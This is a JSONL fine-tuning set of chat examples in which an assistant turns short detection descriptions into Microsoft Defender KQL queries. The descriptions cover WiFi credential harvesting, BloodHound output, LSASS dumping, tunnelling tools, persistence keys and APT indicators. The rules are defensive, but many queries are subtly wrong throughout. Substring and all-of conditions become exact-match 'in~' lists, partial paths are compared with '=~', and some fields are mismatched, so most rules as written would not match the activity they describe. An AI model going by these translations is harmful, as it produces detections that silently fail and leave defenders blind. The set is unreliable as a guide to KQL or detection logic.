{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible collection of data from the clipboard via execution of the osascript binary Topic: proc_creation_macos_clipboard_data_via_osascript"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"osascript\", \" -e \", \"clipboard\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of SysAidServer (as seen in MERCURY threat actor intrusions) Topic: proc_creation_win_java_sysaidserver_susp_child_process"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"SysAidServer\" and (InitiatingProcessFileName in~ (\"\\\\java.exe\", \"\\\\javaw.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect the harvesting of wifi credentials using netsh.exe Topic: proc_creation_win_netsh_wifi_credential_harvesting"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"wlan\", \" s\", \" p\", \" k\", \"=clear\")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects default file names outputted by the BloodHound collection tool SharpHound Topic: file_event_win_bloodhound_collection"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"BloodHound.zip\", \"_computers.json\", \"_containers.json\", \"_domains.json\", \"_gpos.json\", \"_groups.json\", \"_ous.json\", \"_users.json\")) and (not((FileName =~ \"C:\\\\Program Files\\\\WindowsApps\\\\Microsoft.\" and InitiatingProcessFolderPath =~ \"\\\\svchost.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects an attempt to execute code or create service on remote host via winrm.vbs. Topic: proc_creation_win_winrm_execution_via_scripting_api_winrm_vbs"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"winrm\", \"invoke Create wmicimv2/Win32_\", \"-r:http\")) and (FolderPath endswith \"\\\\cscript.exe\" or ProcessVersionInfoOriginalFileName =~ \"cscript.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects indicators of APT 29 (Cozy Bear) phishing-campaign as reported by mandiant Topic: file_event_win_apt_cozy_bear_phishing_campaign_indicators"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"ds7002.lnk\", \"ds7002.pdf\", \"ds7002.zip\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Ditsnap tool, an inspection tool for Active Directory database, ntds.dit. Topic: proc_creation_win_pua_ditsnap"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\ditsnap.exe\" or ProcessCommandLine contains \"ditsnap.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the Chisel tunneling tool via the commandline arguments Topic: proc_creation_win_pua_chisel"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath =~ \"\\\\chisel.exe\" or ((ProcessCommandLine in~ (\"exe client \", \"exe server \")) and (ProcessCommandLine in~ (\"-socks5\", \"-reverse\", \" r:\", \":127.0.0.1:\", \"-tls-skip-verify \", \":socks\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of Time Travel Debugging Utility. Adversaries can execute malicious processes and dump processes, such as lsass.exe, via tttracer.exe. Topic: proc_creation_win_lolbin_tttracer_mod_load"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\tttracer.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects ADDInternals Cmdlet execution. A tool for administering Azure AD and Office 365. Which can be abused by threat actors to attack Azure AD or Office 365. Topic: proc_creation_win_powershell_aadinternals_cmdlets_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Add-AADInt\", \"ConvertTo-AADInt\", \"Disable-AADInt\", \"Enable-AADInt\", \"Export-AADInt\", \"Get-AADInt\", \"Grant-AADInt\", \"Install-AADInt\", \"Invoke-AADInt\", \"Join-AADInt\", \"New-AADInt\", \"Open-AADInt\", \"Read-AADInt\", \"Register-AADInt\", \"Remove-AADInt\", \"Restore-AADInt\", \"Search-AADInt\", \"Send-AADInt\", \"Set-AADInt\", \"Start-AADInt\", \"Update-AADInt\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.Exe\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n Topic: file_event_win_susp_homoglyph_filename"}, {"role": "assistant", "content": "DeviceFileEvents\n| where (FileName in~ (\"\u0430\", \"\u0435\", \"\u043e\", \"\u0440\", \"\u0441\", \"\u0445\", \"\u0455\", \"\u0456\", \"\u04cf\", \"\u0458\", \"\u04bb\", \"\u0501\", \"\u051b\", \"\u051d\", \"\u03bf\")) or (FileName in~ (\"\u0410\", \"\u0412\", \"\u0415\", \"\u041a\", \"\u041c\", \"\u041d\", \"\u041e\", \"\u0420\", \"\u0421\", \"\u0422\", \"\u0425\", \"\u0405\", \"\u0406\", \"\u0408\", \"\u04ae\", \"\u04c0\", \"\u050c\", \"\u051a\", \"\u051c\", \"\u0391\", \"\u0392\", \"\u0395\", \"\u0396\", \"\u0397\", \"\u0399\", \"\u039a\", \"\u039c\", \"\u039d\", \"\u039f\", \"\u03a1\", \"\u03a4\", \"\u03a5\", \"\u03a7\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the Microsoft signed script \"CL_mutexverifiers\" to proxy the execution of additional PowerShell script commands Topic: proc_creation_win_powershell_cl_mutexverifiers"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((InitiatingProcessFileName in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\")) and ProcessCommandLine =~ \" -nologo -windowstyle minimized -file \" and InitiatingProcessFolderPath =~ \"\\\\powershell.exe\") and (ProcessCommandLine in~ (\"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\Windows\\\\Temp\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of a Python path configuration file (.pth) in Python library folders, which can be maliciously abused for code execution and persistence.\nModules referenced by these files are run at every Python startup (v3.5+), regardless of whether the module is imported by the calling script.\nDefault paths are \\lib\\site-packages\\*.pth (Windows) and /lib/pythonX.Y/site-packages/*.pth (Unix and macOS).\n Topic: file_event_lnx_python_path_configuration_files"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".pth\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential registry persistence technique using the Event Viewer \"Events.asp\" technique Topic: registry_set_persistence_event_viewer_events_asp"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where (RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\MicrosoftRedirectionProgram\" or RegistryKey contains \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\MicrosoftRedirectionURL\") and (not((RegistryValueData =~ \"(Empty)\" or (RegistryValueData =~ \"%%SystemRoot%%\\\\PCHealth\\\\HelpCtr\\\\Binaries\\\\HelpCtr.exe\" and InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\MicrosoftRedirectionProgram\") or (RegistryValueData =~ \"-url hcp://services/centers/support*topic=%%s\" and InitiatingProcessFolderPath =~ \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\" and RegistryKey endswith \"\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Event Viewer\\\\MicrosoftRedirectionProgramCommandLineParameters\") or RegistryValueData =~ \"http://go.microsoft.com/fwlink/events.asp\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential persistence activity using LaunchAgents or LaunchDaemons via the PlistBuddy utility Topic: proc_creation_macos_persistence_via_plistbuddy"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"LaunchAgents\", \"LaunchDaemons\")) and InitiatingProcessFolderPath =~ \"/PlistBuddy\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects modifications to the registry key \"HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\Userlist\" where the value is set to \"0\" in order to hide user account from being listed on the logon screen. Topic: registry_set_special_accounts"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ActionType =~ \"RegistryValueSet\" and RegistryKey contains \"\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\\SpecialAccounts\\\\UserList\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects possible successful exploitation for vulnerability described in CVE-2021-26858 by looking for\ncreation of non-standard files on disk by Exchange Server\u2019s Unified Messaging service\nwhich could indicate dropping web shells or other malicious content\n Topic: file_event_win_cve_2021_26858_msexchange"}, {"role": "assistant", "content": "DeviceFileEvents\n| where InitiatingProcessFolderPath =~ \"UMWorkerProcess.exe\" and (not((FileName in~ (\"CacheCleanup.bin\", \".txt\", \".LOG\", \".cfg\", \"cleanup.bin\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects code execution via Pester.bat (Pester - Powershell Modulte for testing) Topic: proc_creation_win_lolbin_pester_1"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"Pester\", \"Get-Help\")) and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))) or (((ProcessCommandLine in~ (\"pester\", \";\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") and (ProcessCommandLine in~ (\"help\", \"?\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the addition of a new rule to the Windows firewall via netsh Topic: proc_creation_win_netsh_fw_add_rule"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" firewall \", \" add \")) and (FolderPath endswith \"\\\\netsh.exe\" or ProcessVersionInfoOriginalFileName =~ \"netsh.exe\")) and (not(((ProcessCommandLine contains \"advfirewall firewall add rule name=Dropbox dir=in action=allow \\\"program=\" and ProcessCommandLine contains \":\\\\Program Files (x86)\\\\Dropbox\\\\Client\\\\Dropbox.exe\\\" enable=yes profile=Any\") or (ProcessCommandLine contains \"advfirewall firewall add rule name=Dropbox dir=in action=allow \\\"program=\" and ProcessCommandLine contains \":\\\\Program Files\\\\Dropbox\\\\Client\\\\Dropbox.exe\\\" enable=yes profile=Any\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects presence of a potentially xor encoded powershell command Topic: proc_creation_win_powershell_xor_commandline"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"ForEach\", \"for(\", \"for \", \"-join \", \"-join'\", \"-join\\\"\", \"-join`\", \"::Join\", \"[char]\")) and ProcessCommandLine =~ \"bxor\" and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")) or ProcessVersionInfoFileDescription =~ \"Windows PowerShell\" or ProcessVersionInfoProductName =~ \"PowerShell Core 6\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: proc_creation_win_remote_access_tools_anydesk"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath endswith \"\\\\AnyDesk.exe\" or ProcessVersionInfoFileDescription =~ \"AnyDesk\" or ProcessVersionInfoProductName =~ \"AnyDesk\" or ProcessVersionInfoCompanyName =~ \"AnyDesk Software GmbH\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of SharpMove, a .NET utility performing multiple tasks such as \"Task Creation\", \"SCM\" query, VBScript execution using WMI via its PE metadata and command line options.\n Topic: proc_creation_win_hktl_sharpmove"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\SharpMove.exe\" or ProcessVersionInfoOriginalFileName =~ \"SharpMove.exe\") or ((ProcessCommandLine in~ (\"action=create\", \"action=dcom\", \"action=executevbs\", \"action=hijackdcom\", \"action=modschtask\", \"action=modsvc\", \"action=query\", \"action=scm\", \"action=startservice\", \"action=taskscheduler\")) and ProcessCommandLine =~ \"computername=\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of Rundll32 to launch an NSIS module that serves as the main stealer capability of Rhadamanthys infostealer, as observed in reports and samples in early 2023 Topic: proc_creation_win_malware_rhadamanthys_stealer_dll_launch"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"nsis_uns\" and ProcessCommandLine =~ \"PrintUIEntry\" and (ProcessVersionInfoOriginalFileName =~ \"RUNDLL32.EXE\" or FolderPath endswith \"\\\\rundll32.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Access to Domain Group Policies stored in SYSVOL Topic: proc_creation_win_susp_sysvol_access"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\SYSVOL\\\\\", \"\\\\policies\\\\\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "An adversary may use legitimate desktop support and remote access software, such as Team Viewer, Go2Assist, LogMein, AmmyyAdmin, etc, to establish an interactive command and control channel to target systems within networks.\nThese services are commonly used as legitimate technical support software, and may be allowed by application control within a target environment.\nRemote access tools like VNC, Ammyy, and Teamviewer are used frequently when compared with other legitimate software commonly used by adversaries. (Citation: Symantec Living off the Land)\n Topic: file_event_win_anydesk_artefact"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName in~ (\"\\\\AppData\\\\Roaming\\\\AnyDesk\\\\user.conf\", \"\\\\AppData\\\\Roaming\\\\AnyDesk\\\\system.conf\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects creation of the PSEXEC key file. Which is created anytime a PsExec command is executed. It gets written to the file system and will be recorded in the USN Journal on the target system Topic: file_event_win_sysinternals_psexec_service_key"}, {"role": "assistant", "content": "DeviceFileEvents\n| where FileName =~ \".key\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "This rule detects execution of a PowerShell code through the sqltoolsps.exe utility, which is included in the standard set of utilities supplied with the Microsoft SQL Server Management studio.\nScript blocks are not logged in this case, so this utility helps to bypass protection mechanisms based on the analysis of these logs.\n Topic: proc_creation_win_mssql_sqltoolsps_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\sqltoolsps.exe\" or InitiatingProcessFolderPath endswith \"\\\\sqltoolsps.exe\" or ProcessVersionInfoOriginalFileName =~ \"\\\\sqltoolsps.exe\") and (not(InitiatingProcessFileName =~ \"\\\\smss.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker modifies the registry value of the \"hhctrl\" to point to a custom binary Topic: registry_set_hhctrl_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey contains \"\\\\CLSID\\\\{52A2AAAE-085D-4187-97EA-8C30DB990436}\\\\InprocServer32\\\\(Default)\" and (not(RegistryValueData =~ \"C:\\\\Windows\\\\System32\\\\hhctrl.ocx\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of the built-in PowerShell cmdlet \"Enable-WindowsOptionalFeature\" used as a Deployment Image Servicing and Management tool.\nSimilar to DISM.exe, this cmdlet is used to enumerate, install, uninstall, configure, and update features and packages in Windows images\n Topic: proc_creation_win_powershell_enable_susp_windows_optional_feature"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"Enable-WindowsOptionalFeature\", \"-Online\", \"-FeatureName\")) and (ProcessCommandLine in~ (\"TelnetServer\", \"Internet-Explorer-Optional-amd64\", \"TFTP\", \"SMB1Protocol\", \"Client-ProjFS\", \"Microsoft-Windows-Subsystem-Linux\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of \"cmdkey.exe\" to add generic credentials.\nAs an example, this can be used before connecting to an RDP session via command line interface.\n Topic: proc_creation_win_cmdkey_adding_generic_creds"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath endswith \"\\\\cmdkey.exe\" or ProcessVersionInfoOriginalFileName =~ \"cmdkey.exe\") and (ProcessCommandLine contains \" -g\" or ProcessCommandLine contains \" /g\" or ProcessCommandLine contains \" \u2013g\" or ProcessCommandLine contains \" \u2014g\" or ProcessCommandLine contains \" \u2015g\") and (ProcessCommandLine contains \" -u\" or ProcessCommandLine contains \" /u\" or ProcessCommandLine contains \" \u2013u\" or ProcessCommandLine contains \" \u2014u\" or ProcessCommandLine contains \" \u2015u\") and (ProcessCommandLine contains \" -p\" or ProcessCommandLine contains \" /p\" or ProcessCommandLine contains \" \u2013p\" or ProcessCommandLine contains \" \u2014p\" or ProcessCommandLine contains \" \u2015p\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Threat actors can use auditpol binary to change audit policy configuration to impair detection capability.\nThis can be carried out by selectively disabling/removing certain audit policies as well as restoring a custom policy owned by the threat actor.\n Topic: proc_creation_win_auditpol_susp_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"disable\", \"clear\", \"remove\", \"restore\")) and (FolderPath endswith \"\\\\auditpol.exe\" or ProcessVersionInfoOriginalFileName =~ \"AUDITPOL.EXE\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"NoLMHash\" registry value in order to allow Windows to store LM Hashes.\nBy setting this registry value to \"0\" (DWORD), Windows will be allowed to store a LAN manager hash of your password in Active Directory and local SAM databases.\n Topic: registry_set_system_lsa_nolmhash"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\NoLMHash\" and RegistryValueData =~ \"DWORD (0x00000000)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n Topic: registry_set_lsa_disablerestrictedadmin"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"System\\\\CurrentControlSet\\\\Control\\\\Lsa\\\\DisableRestrictedAdmin\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the enabling of the \"EnablePeriodicBackup\" registry value. Once enabled, The OS will backup System registry hives on restarts to the \"C:\\Windows\\System32\\config\\RegBack\" folder. Windows creates a \"RegIdleBackup\" task to manage subsequent backups.\nRegistry backup was a default behavior on Windows and was disabled as of \"Windows 10, version 1803\".\n Topic: registry_set_enable_periodic_backup"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Control\\\\Session Manager\\\\Configuration Manager\\\\EnablePeriodicBackup\" and RegistryValueData =~ \"DWORD (0x00000001)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects port forwarding activity via SSH.exe Topic: proc_creation_win_ssh_port_forward"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine contains \" -R \" or ProcessCommandLine contains \" /R \" or ProcessCommandLine contains \" \u2013R \" or ProcessCommandLine contains \" \u2014R \" or ProcessCommandLine contains \" \u2015R \") and InitiatingProcessFolderPath =~ \"\\\\ssh.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the RunXCmd tool to execute commands with System or TrustedInstaller accounts Topic: proc_creation_win_pua_runxcmd"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" /account=system \", \" /account=ti \")) and ProcessCommandLine =~ \"/exec=\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of csrutil to view the Configure System Integrity Protection (SIP) status. This technique is used in post-exploit scenarios.\n Topic: proc_creation_macos_csrutil_status"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"status\" and InitiatingProcessFolderPath =~ \"/csrutil\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a CodePage modification using the \"mode.com\" utility.\nThis behavior has been used by threat actors behind Dharma ransomware.\n Topic: proc_creation_win_mode_codepage_change"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\" con \", \" cp \", \" select=\")) and (FolderPath endswith \"\\\\mode.com\" or ProcessVersionInfoOriginalFileName =~ \"MODE.COM\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects scheduled task creation events that include suspicious actions, and is run once at 00:00 Topic: proc_creation_win_schtasks_one_time_only_midnight_task"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"wscript\", \"vbscript\", \"cscript\", \"wmic \", \"wmic.exe\", \"regsvr32.exe\", \"powershell\", \"\\\\AppData\\\\\")) and (FolderPath contains \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\") and (ProcessCommandLine in~ (\"once\", \"00:00\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of different Windows based hacktools via PE metadata (company, product, etc.) even if the files have been renamed Topic: proc_creation_win_hktl_execution_via_pe_metadata"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessVersionInfoCompanyName =~ \"Cube0x0\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential suspicious child processes of \"3CXDesktopApp.exe\". Which could be related to the 3CXDesktopApp supply chain compromise Topic: proc_creation_win_malware_3cx_compromise_susp_children"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\3CXDesktopApp.exe\" and (InitiatingProcessFolderPath in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects specific command line execution used by Mustang Panda in a targeted attack against the Australian government as reported by Lab52 Topic: proc_creation_win_apt_mustang_panda_indicators"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"copy SolidPDFCreator.dll\", \"C:\\\\Users\\\\Public\\\\Libraries\\\\PhotoTvRHD\\\\SolidPDFCreator.dll\")) or (ProcessCommandLine in~ (\"reg \", \"\\\\Windows\\\\CurrentVersion\\\\Run\", \"SolidPDF\", \"C:\\\\Users\\\\Public\\\\Libraries\\\\PhotoTvRHD\\\\\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects VBScript content stored into registry keys as seen being used by UNC2452 group Topic: registry_set_vbs_payload_stored"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where ((RegistryValueData contains \"vbscript:\" or RegistryValueData contains \"jscript:\" or RegistryValueData contains \"mshtml,\" or RegistryValueData contains \"RunHTMLApplication\" or RegistryValueData contains \"Execute(\" or RegistryValueData contains \"CreateObject\" or RegistryValueData contains \"window.close\") and RegistryKey contains \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\") and (not((RegistryKey contains \"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\" or ((RegistryValueData contains \"\\\\Microsoft.NET\\\\Primary Interop Assemblies\\\\Microsoft.mshtml.dll\" or RegistryValueData contains \"<\\\\Microsoft.mshtml,fileVersion=\" or RegistryValueData contains \"_mshtml_dll_\" or RegistryValueData contains \"<\\\\Microsoft.mshtml,culture=\") and InitiatingProcessFolderPath =~ \"\\\\msiexec.exe\" and RegistryKey endswith \"\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Installer\\\\UserData*\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network Topic: proc_creation_win_tasklist_basic_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \"tasklist\" or FolderPath endswith \"\\\\tasklist.exe\" or ProcessVersionInfoOriginalFileName =~ \"tasklist.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of Cmdl32 with the \"/vpn\" and \"/lan\" flags.\nAttackers can abuse this utility in order to download arbitrary files via a configuration file.\nInspect the location and the content of the file passed as an argument in order to determine if it is suspicious.\n Topic: proc_creation_win_cmdl32_arbitrary_file_download"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/vpn\", \"/lan\")) and (FolderPath endswith \"\\\\cmdl32.exe\" or ProcessVersionInfoOriginalFileName =~ \"CMDL32.EXE\")"}]}
